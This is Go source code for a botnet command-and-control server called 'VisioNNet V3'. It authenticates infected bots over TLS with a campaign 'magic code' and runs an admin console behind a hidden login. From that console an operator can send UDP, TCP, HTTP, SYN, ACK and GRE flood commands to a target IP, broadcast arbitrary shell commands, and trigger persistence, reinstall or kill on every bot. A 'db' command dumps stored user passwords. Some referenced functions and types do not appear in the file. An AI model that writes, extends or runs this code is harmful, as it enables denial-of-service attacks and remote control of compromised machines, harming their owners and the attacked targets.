package main

import (
	"bufio"
	"crypto/md5"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"net"
	"os"
	"strings"
	"sync"
	"time"
)

const (
	// File paths
	USERS_FILE = "users.json"

	// Server IPs
	USER_SERVER_IP = "1.1.1.1"
	BOT_SERVER_IP  = "1.1.1.1"

	// Server ports
	BOT_SERVER_PORT  = "443" // do not change
	USER_SERVER_PORT = "420"  

	// Authentication  these must match bot
	MAGIC_CODE       = "QdT2Kp1!2@FnB#v5"   //change this per campaign 
	PROTOCOL_VERSION = "v1.0"    //change this per campaign  
)

type BotConnection struct {
	conn          net.Conn
	botID         string
	connectedAt   time.Time
	lastPing      time.Time
	authenticated bool
	arch          string
	ip            string
}

type client struct {
	conn           net.Conn
	user           User
	lastBotCommand time.Time
}

type attack struct {
	method   string
	ip       string
	port     string
	duration time.Duration
	start    time.Time
}

type Credential struct {
	Username string `json:"Username"`
	Password string `json:"Password"`
	Expire   string `json:"Expire"`
	Level    string `json:"Level"`
}

var (
	ongoingAttacks = make(map[net.Conn]attack)
	botConnections = make(map[string]*BotConnection)
	botConnsLock   sync.RWMutex
	botCount       int
	botConns       []net.Conn
)

type bot struct {
	arch string
	conn net.Conn
}

var (
	bots       = []bot{}
	clients    = []*client{}
	maxAttacks = 20
)

// Authentication functions - only keep what's needed for C2
func generateAuthResponse(challenge, secret string) string {
	h := md5.New()
	h.Write([]byte(challenge + secret + challenge))
	response := base64.StdEncoding.EncodeToString(h.Sum(nil))
	return response
}

func randomChallenge(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

// Bot management functions
func addBotConnection(conn net.Conn, botID string, arch string) {
	botConnsLock.Lock()
	defer botConnsLock.Unlock()

	// Check for duplicates
	if existing, exists := botConnections[botID]; exists {
		// Close old connection
		if existing.conn != nil {
			existing.conn.Close()
		}
		fmt.Printf("[☾℣☽] Replacing duplicate bot connection: %s (%s)\n", botID, conn.RemoteAddr())
	}

	botConn := &BotConnection{
		conn:          conn,
		botID:         botID,
		connectedAt:   time.Now(),
		lastPing:      time.Now(),
		authenticated: true,
		arch:          arch,
		ip:            conn.RemoteAddr().String(),
	}

	botConnections[botID] = botConn
	botConns = append(botConns, conn)
	botCount++

	fmt.Printf("[☾℣☽] Bot authenticated: %s | Arch: %s | IP: %s | Total: %d\n",
		botID, arch, conn.RemoteAddr(), botCount)
}

func removeBotConnection(botID string) {
	botConnsLock.Lock()
	defer botConnsLock.Unlock()

	if botConn, exists := botConnections[botID]; exists {
		botConn.conn.Close()
		delete(botConnections, botID)
		botCount--

		// Remove from legacy list
		for i, conn := range botConns {
			if conn == botConn.conn {
				botConns = append(botConns[:i], botConns[i+1:]...)
				break
			}
		}
	}
}

func cleanupDeadBots() {
	ticker := time.NewTicker(60 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		botConnsLock.Lock()
		now := time.Now()
		deadBots := []string{}

		for botID, botConn := range botConnections {
			// If bot hasn't pinged in 5 minutes, consider it dead
			if now.Sub(botConn.lastPing) > 5*time.Minute {
				deadBots = append(deadBots, botID)
				fmt.Printf("[CLEANUP] Removing dead bot: %s (Last ping: %v ago)\n",
					botID, now.Sub(botConn.lastPing))
			}
		}

		for _, botID := range deadBots {
			if botConn, exists := botConnections[botID]; exists {
				botConn.conn.Close()
				delete(botConnections, botID)
				botCount--
			}
		}
		botConnsLock.Unlock()

		if len(deadBots) > 0 {
			fmt.Printf("[CLEANUP] Removed %d dead bots | Total alive: %d\n", len(deadBots), botCount)
		}
	}
}

// Handle bot connection with authentication
func handleBotConnection(conn net.Conn) {
	defer func() {
		// Find and remove from connections map
		botConnsLock.Lock()
		for botID, botConn := range botConnections {
			if botConn.conn == conn {
				delete(botConnections, botID)
				botCount--
				fmt.Printf("[☾℣☽] Bot disconnected: %s (%s)\n", botID, conn.RemoteAddr())
				break
			}
		}

		// Remove from legacy list
		for i, botConn := range botConns {
			if botConn == conn {
				botConns = append(botConns[:i], botConns[i+1:]...)
				break
			}
		}
		botConnsLock.Unlock()

		conn.Close()
	}()

	reader := bufio.NewReader(conn)
	writer := bufio.NewWriter(conn)

	// Step 1: Send authentication challenge
	challenge := randomChallenge(32)
	if _, err := writer.WriteString(fmt.Sprintf("AUTH_CHALLENGE:%s\n", challenge)); err != nil {
		return
	}
	writer.Flush()

	fmt.Printf("[AUTH] Sent challenge to %s\n", conn.RemoteAddr())

	// Step 2: Read bot's response
	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	authResponse, err := reader.ReadString('\n')
	if err != nil {
		fmt.Printf("[AUTH] Failed to read auth response from %s: %v\n", conn.RemoteAddr(), err)
		return
	}

	authResponse = strings.TrimSpace(authResponse)

	// Step 3: Verify response
	expectedResponse := generateAuthResponse(challenge, MAGIC_CODE)
	if authResponse != expectedResponse {
		fmt.Printf("[AUTH] Invalid auth from %s. Got: %s... Expected: %s...\n",
			conn.RemoteAddr(),
			safeSubstring(authResponse, 0, 10),
			safeSubstring(expectedResponse, 0, 10))
		writer.WriteString("AUTH_FAILED\n")
		writer.Flush()
		return
	}

	// Step 4: Send success
	writer.WriteString("AUTH_SUCCESS\n")
	writer.Flush()

	fmt.Printf("[AUTH] Authentication successful for %s\n", conn.RemoteAddr())

	// Step 5: Wait for bot registration
	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	registerMsg, err := reader.ReadString('\n')
	if err != nil {
		fmt.Printf("[AUTH] Failed to read registration from %s: %v\n", conn.RemoteAddr(), err)
		return
	}

	registerMsg = strings.TrimSpace(registerMsg)

	// Parse registration message (expected format: "REGISTER:v1.0:botID:arch")
	if !strings.HasPrefix(registerMsg, "REGISTER:") {
		fmt.Printf("[AUTH] Invalid registration format from %s: %s\n", conn.RemoteAddr(), registerMsg)
		return
	}

	parts := strings.Split(registerMsg, ":")
	if len(parts) < 3 {
		fmt.Printf("[AUTH] Malformed registration from %s: %s\n", conn.RemoteAddr(), registerMsg)
		return
	}

	version := parts[1]
	botID := parts[2]
	arch := "unknown"
	if len(parts) > 3 {
		arch = parts[3]
	}

	// Your existing version check
	if version != PROTOCOL_VERSION {
		fmt.Printf("[AUTH] Version mismatch from %s: got %s, expected %s\n",
			conn.RemoteAddr(), version, PROTOCOL_VERSION)
		return
	}

	// Add bot to connections
	addBotConnection(conn, botID, arch)

	// Reset deadline for normal operation
	conn.SetDeadline(time.Time{})

	// Start ping handler
	stopPing := make(chan struct{})
	defer close(stopPing)
	go pingHandler(conn, botID, stopPing)

	// Main bot command loop
	for {
		conn.SetReadDeadline(time.Now().Add(180 * time.Second))
		line, err := reader.ReadString('\n')
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				// Timeout - send ping
				writer.WriteString("PING\n")
				writer.Flush()
				continue
			}
			break
		}

		line = strings.TrimSpace(line)

		// Update last ping time
		if line == "PONG" {
			botConnsLock.Lock()
			if botConn, exists := botConnections[botID]; exists {
				botConn.lastPing = time.Now()
			}
			botConnsLock.Unlock()
			continue
		}

		// Handle other bot messages
		fmt.Printf("[BOT-%s] %s\n", botID, line)
	}
}

func pingHandler(conn net.Conn, botID string, stop chan struct{}) {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			if _, err := conn.Write([]byte("PING\n")); err != nil {
				return
			}
		case <-stop:
			return
		}
	}
}

func safeSubstring(s string, start, length int) string {
	if start >= len(s) {
		return ""
	}
	end := start + length
	if end > len(s) {
		end = len(s)
	}
	return s[start:end]
}

// Load TLS configuration from server.crt and server.key
func loadTLSConfig() *tls.Config {
	cert, err := tls.LoadX509KeyPair("server.crt", "server.key")
	if err != nil {
		fmt.Printf("[FATAL] Failed to load TLS certificates: %v\n", err)
		fmt.Println("[FATAL] Make sure server.crt and server.key exist in the current directory")
		os.Exit(1)
	}

	return &tls.Config{
		Certificates: []tls.Certificate{cert},
		MinVersion:   tls.VersionTLS12,
		CurvePreferences: []tls.CurveID{
			tls.X25519,
			tls.CurveP256,
		},
		PreferServerCipherSuites: true,
		CipherSuites: []uint16{
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
		},
	}
}

func main() {
	// Check if users.json file exists; if not, create a root user
	if _, fileError := os.ReadFile("users.json"); fileError != nil {
		password, err := randomString(12)
		if err != nil {
			fmt.Println("Error generating password:", err)
			return
		}

		rootUser := User{
			Username: "root",
			Password: password,
			Expire:   time.Now().AddDate(111, 111, 111),
			Level:    "Owner",
		}

		bytes, err := json.Marshal([]User{rootUser})
		if err != nil {
			fmt.Println("Error marshalling user data:", err)
			return
		}

		if err := os.WriteFile("users.json", bytes, 0777); err != nil {
			fmt.Println("Error writing to users.json:", err)
			return
		}
		fmt.Println("[☾℣☽] Login with username", rootUser.Username, "and password", rootUser.Password)
	}

	// Load TLS configuration
	fmt.Println("[INFO] Loading TLS certificates...")
	tlsConfig := loadTLSConfig()
	fmt.Println("[INFO] TLS configuration loaded successfully")

	// Start dead bot cleanup routine
	go cleanupDeadBots()

	// Start bot server (TLS ONLY)
	go func() {
		fmt.Println("[☾℣☽] Bot TLS server starting on", BOT_SERVER_IP+":"+BOT_SERVER_PORT)
		botListener, err := tls.Listen("tcp", BOT_SERVER_IP+":"+BOT_SERVER_PORT, tlsConfig)
		if err != nil {
			fmt.Println("[FATAL] Error starting bot TLS server:", err)
			os.Exit(1)
		}
		defer botListener.Close()

		fmt.Println("[☾℣☽] Bot TLS server is running on port 443")
		fmt.Println("[AUTH] Using magic code authentication:", MAGIC_CODE)

		for {
			conn, err := botListener.Accept()
			if err != nil {
				fmt.Println("Error accepting bot TLS connection:", err)
				continue
			}

			// Validate TLS and start authentication
			go validateTLSHandshake(conn)
		}
	}()

	// Start admin CLI server (plain TCP)
	fmt.Println("[☾℣☽] Admin CLI server starting on", USER_SERVER_IP+":"+USER_SERVER_PORT)
	userListener, err := net.Listen("tcp", USER_SERVER_IP+":"+USER_SERVER_PORT)
	if err != nil {
		fmt.Println("Error starting user server:", err)
		return
	}
	defer userListener.Close()

	go updateTitle()

	// User connection handling
	for {
		conn, err := userListener.Accept()
		if err != nil {
			fmt.Println("Error accepting user connection:", err)
			continue
		}
		fmt.Println("[☾℣☽] [User] Connected To Login Port:", conn.RemoteAddr())

		go handleRequest(conn)
	}
}

// Validate TLS handshake and ensure it's from our bot
func validateTLSHandshake(conn net.Conn) {
	defer func() {
		if r := recover(); r != nil {
			fmt.Printf("[PANIC] in validateTLSHandshake: %v\n", r)
			conn.Close()
		}
	}()

	tlsConn, ok := conn.(*tls.Conn)
	if !ok {
		return
	}

	tlsConn.SetDeadline(time.Now().Add(10 * time.Second))

	if err := tlsConn.Handshake(); err != nil {
		return
	}

	state := tlsConn.ConnectionState()
	if state.Version < tls.VersionTLS12 {
		tlsConn.Close()
		return
	}

	// Accept all modern cipher suites
	validCiphers := map[uint16]bool{
		tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:   true,
		tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256: true,
		tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:         true,
		tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:       true,
		tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:         true,
		tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:       true,
		0x1301: true,
		0x1302: true,
		0x1303: true,
	}

	if state.Version == tls.VersionTLS13 {
		fmt.Printf("[ACCEPT] TLS 1.3 connection from %s\n", conn.RemoteAddr())
	} else if !validCiphers[state.CipherSuite] {
		tlsConn.Close()
		return
	}

	// Reset deadline for authentication phase
	tlsConn.SetDeadline(time.Time{})

	// Start authentication process
	go handleBotConnection(conn)
}

func updateTitle() {
	for {
		for _, cl := range clients {
			go func(c *client) {
				spinChars := []rune{'∴', '∵'}
				spinIndex := 0

				for {
					attackCount := len(ongoingAttacks)

					title := fmt.Sprintf("    [%c]  Servers: %d | Attacks: %d/%d | ℣ | User: %s [%c]",
						spinChars[spinIndex], getBotCount(), attackCount, maxAttacks, c.user.Username, spinChars[spinIndex])
					setTitle(c.conn, title)
					spinIndex = (spinIndex + 1) % len(spinChars)
					time.Sleep(1 * time.Second)
				}
			}(cl)
		}
		time.Sleep(time.Second * 2)
	}
}

// Get authenticated bot count
func getBotCount() int {
	botConnsLock.RLock()
	defer botConnsLock.RUnlock()
	count := 0
	for _, botConn := range botConnections {
		if botConn.authenticated {
			count++
		}
	}
	return count
}

// New Banner Art
func showBanner(conn net.Conn) {
	conn.Write([]byte("\r\n"))
	conn.Write([]byte("\r\n"))
	conn.Write([]byte("\033[1;31m        ╔═══════════════════════════════════════════════╗    \033[0m \r\n"))
	conn.Write([]byte("\033[1;31m        ║\033[1;97m- - - - - - \033[1;31mWelcome To VisioN\033[1;97Net V\033[1;97m3\033[1;97m - - - - - -\033[1;31m║   \033[0m \r\n"))
	conn.Write([]byte("\033[1;31m        ║\033[1;97m- - - - - - \033[1;31mOnline And Ready To \033[1;97mNull\033[1;97m - - - - - -\033[1;31m║    \033[0m \r\n"))
	conn.Write([]byte("\033[1;31m        ║\033[1;97m     - - - -\033[1;31m\033[1;31mType help for commands\033[1;97m!- - - -\033[1;31m║    \033[0m \r\n"))
	conn.Write([]byte("\033[1;31m        ╚═══════════════════════════════════════════════╝   \033[0m \r\n"))
	conn.Write([]byte("\r\n"))
	conn.Write([]byte("       Authenticated Bots: "))
	conn.Write([]byte(fmt.Sprintf("%d", getBotCount())))
	conn.Write([]byte("\n\r"))
	conn.Write([]byte("  ───────────────────────────────────────\n\r"))
	conn.Write([]byte("\033[38;5;46m"))
	conn.Write([]byte("\033[0m"))
}

func authUser(conn net.Conn) (bool, *client) {
	for i := 0; i < 3; i++ {
		conn.Write([]byte("\033[0m"))
		conn.Write([]byte("\r\n\r\n\r\n\r\n\r\n\r\n\r\n"))
		conn.Write([]byte("\r                        \033[38;5;109m► Auth\033[38;5;146ment\033[38;5;182micat\033[38;5;218mion -- \033[38;5;196mReq\033[38;5;161muir\033[38;5;89med\n"))
		conn.Write([]byte("\033[0m\r                       ☉ Username\033[38;5;62m: "))
		username, _ := getFromConn(conn)
		conn.Write([]byte("\033[0m\r                       ☉ Password\033[38;5;62m: \033[38;5;255m\033[48;5;255m"))
		password, _ := getFromConn(conn)
		conn.Write([]byte("\033[0m"))
		conn.Write([]byte("\033[2J\033[3J"))

		if exists, user := AuthUser(username, password); exists {
			loggedClient := &client{
				conn: conn,
				user: *user,
			}
			clients = append(clients, loggedClient)
			return true, loggedClient
		}
	}
	conn.Close()
	return false, nil
}

func getFromConn(conn net.Conn) (string, error) {
	readString, err := bufio.NewReader(conn).ReadString('\n')
	if err != nil {
		println(err.Error())
		return readString, err
	}
	readString = strings.TrimSuffix(readString, "\n")
	readString = strings.TrimSuffix(readString, "\r")
	return readString, nil
}

// Send commands to authenticated bots only
func sendToBots(command string) {
	botConnsLock.RLock()
	defer botConnsLock.RUnlock()

	sentCount := 0
	for _, botConn := range botConnections {
		if botConn.authenticated {
			_, err := botConn.conn.Write([]byte(command + "\n"))
			if err != nil {
				fmt.Printf("[ERROR] Failed to send to bot %s: %v\n", botConn.botID, err)
				// Mark for cleanup
				go removeBotConnection(botConn.botID)
			} else {
				sentCount++
			}
		}
	}

	fmt.Printf("[COMMAND] Sent to %d/%d bots: %s\n", sentCount, len(botConnections), command)
}

func handleRequest(conn net.Conn) {
	conn.Write([]byte(getConsoleTitleAnsi("☾℣☽")))
	readString, err := bufio.NewReader(conn).ReadString('\n')
	if err != nil {
		println(err.Error())
		return
	}

	if strings.HasPrefix(readString, "spamtec") {
		if authed, _ := authUser(conn); authed {
			showBanner(conn)
			conn.Write([]byte("\033[0m\r  \033[38;5;15m\033[38;5;118m✅ Authentication Successful\n"))

			for {
				conn.Write([]byte("\n\r\033[38;5;146m[\033[38;5;161mPro\033[38;5;89mmpt\033[38;5;146m]\033[38;5;82m► \033[0m"))

				readString, err := bufio.NewReader(conn).ReadString('\n')
				if err != nil {
					if err == io.EOF {
						return
					}
					fmt.Printf("Error reading input: %v\n", err)
					conn.Close()
					return
				}
				readString = strings.TrimSuffix(readString, "\r\n")
				readString = strings.TrimSuffix(readString, "\n")

				parts := strings.Fields(readString)
				if len(parts) < 1 {
					continue
				}
				command := parts[0]
				switch strings.ToLower(command) {

				case "!udpflood", "!tcpflood", "!http", "!syn", "!ack", "!gre":
					if len(parts) < 4 {
						conn.Write([]byte("Usage: method ip port duration\r\n"))
						continue
					}

					method := parts[0]
					ip := parts[1]
					port := parts[2]
					duration := parts[3]
					dur, err := time.ParseDuration(duration + "s")
					if err != nil {
						conn.Write([]byte("Invalid duration format.\r\n"))
						continue
					}
					conn.Write([]byte("\r\n"))
					conn.Write([]byte(fmt.Sprintf("host: %s\r\n", ip)))
					conn.Write([]byte(fmt.Sprintf("port: %s\r\n", port)))
					conn.Write([]byte(fmt.Sprintf("length: %s\r\n", duration)))
					conn.Write([]byte(fmt.Sprintf("method: %s\r\n", method)))
					conn.Write([]byte("\r\n"))

					ongoingAttacks[conn] = attack{
						method:   method,
						ip:       ip,
						port:     port,
						duration: dur,
						start:    time.Now(),
					}

					go func(conn net.Conn, attack attack) {
						time.Sleep(attack.duration)
						delete(ongoingAttacks, conn)
						conn.Write([]byte("Attack has automatically finished and was removed.\n"))
					}(conn, ongoingAttacks[conn])

					sendToBots(fmt.Sprintf("%s %s %s %s", method, ip, port, duration))

				case "ongoing":
					// Show ongoing attacks
					conn.Write([]byte("Ongoing Attacks:\r\n"))
					for _, attack := range ongoingAttacks {
						remaining := time.Until(attack.start.Add(attack.duration))
						if remaining > 0 {
							conn.Write([]byte(fmt.Sprintf("  %s -> %s:%s (%v remaining)\r\n",
								attack.method, attack.ip, attack.port, remaining.Round(time.Second))))
						}
					}

				case "!shell", "!exec":
					if len(parts) < 2 {
						conn.Write([]byte("usage: !shell <command>\r\n"))
						continue
					}
					shellCmd := strings.Join(parts[1:], " ")
					sendToBots(fmt.Sprintf("!shell %s", shellCmd))
					conn.Write([]byte(fmt.Sprintf("Shell command sent to all bots: %s\r\n", shellCmd)))

				case "!detach", "!bg":
					if len(parts) < 2 {
						conn.Write([]byte("usage: !detach <command>\r\n"))
						continue
					}
					shellCmd := strings.Join(parts[1:], " ")
					sendToBots(fmt.Sprintf("!detach %s", shellCmd))
					conn.Write([]byte(fmt.Sprintf("Detached command sent to all bots: %s\r\n", shellCmd)))

				case "banner":
					showBanner(conn)
				case "bots", "bot":
					conn.Write([]byte(fmt.Sprintf("\033[38;5;27m[\033[38;5;15mBots\033[38;5;73m: \033[38;5;15m%d \033[38;5;27m] \n\r", getBotCount())))
					// Show bot details
					botConnsLock.RLock()
					if len(botConnections) > 0 {
						conn.Write([]byte("\n\rConnected Bots:\r\n"))
						conn.Write([]byte("──────────────────────────────────────\r\n"))
						for _, botConn := range botConnections {
							uptime := time.Since(botConn.connectedAt).Round(time.Second)
							lastSeen := time.Since(botConn.lastPing).Round(time.Second)
							conn.Write([]byte(fmt.Sprintf("  ID: %s | IP: %s | Arch: %s\n\r",
								botConn.botID, botConn.ip, botConn.arch)))
							conn.Write([]byte(fmt.Sprintf("      Uptime: %v | Last: %v\n\r", uptime, lastSeen)))
						}
					}
					botConnsLock.RUnlock()
				case "cls", "clear":
					conn.Write([]byte("\033[2J\033[H"))
					showBanner(conn)
				case "logout", "exit":
					conn.Write([]byte("\033[38;5;27mLogging out...\n\r"))
					conn.Close()
					return
				case "!reinstall":
					sendToBots("!reinstall")
				case "!lolnogtfo":
					sendToBots("!kill")
				case "persist":
					sendToBots("!persist")
				case "help":
					conn.Write([]byte("\x1b[38;5;231m -> [ bots, clear, help, db, ongoing, private] \n\r"))
				case "db":
					file, err := os.Open("./users.json")
					if err != nil {
						conn.Write([]byte(fmt.Sprintf("Error opening credentials file: %v\r\n", err)))
						return
					}
					defer file.Close()

					data, err := ioutil.ReadAll(file)
					if err != nil {
						conn.Write([]byte(fmt.Sprintf("Error reading file: %v\r\n", err)))
						return
					}

					var credentials []Credential
					err = json.Unmarshal(data, &credentials)
					if err != nil {
						conn.Write([]byte(fmt.Sprintf("Error parsing JSON: %v\r\n", err)))
						return
					}

					for _, cred := range credentials {
						message := fmt.Sprintf(
							"credentials: Username: %s, Password: %s, Expire: %s, Level: %s\r\n",
							cred.Username, cred.Password, cred.Expire, cred.Level,
						)
						conn.Write([]byte(message))
					}

				case "?":
					conn.Write([]byte("====== ATTACKS ====== \n\r"))
					conn.Write([]byte("!udpflood\n\r"))
					conn.Write([]byte("!tcpflood\n\r"))
					conn.Write([]byte("!http\n\r"))
					conn.Write([]byte("!syn\n\r"))
					conn.Write([]byte("!ack\n\r"))
					conn.Write([]byte("!gre\n\r"))

				case "private":
					conn.Write([]byte("!persist\n\r "))
					conn.Write([]byte("!lolnogtfo \n\r"))
				default:
					fmt.Printf("Received input: '%s'\n", readString)
					conn.Write([]byte("Invalid command.\n\r"))
				}
			}
		}
	}
}
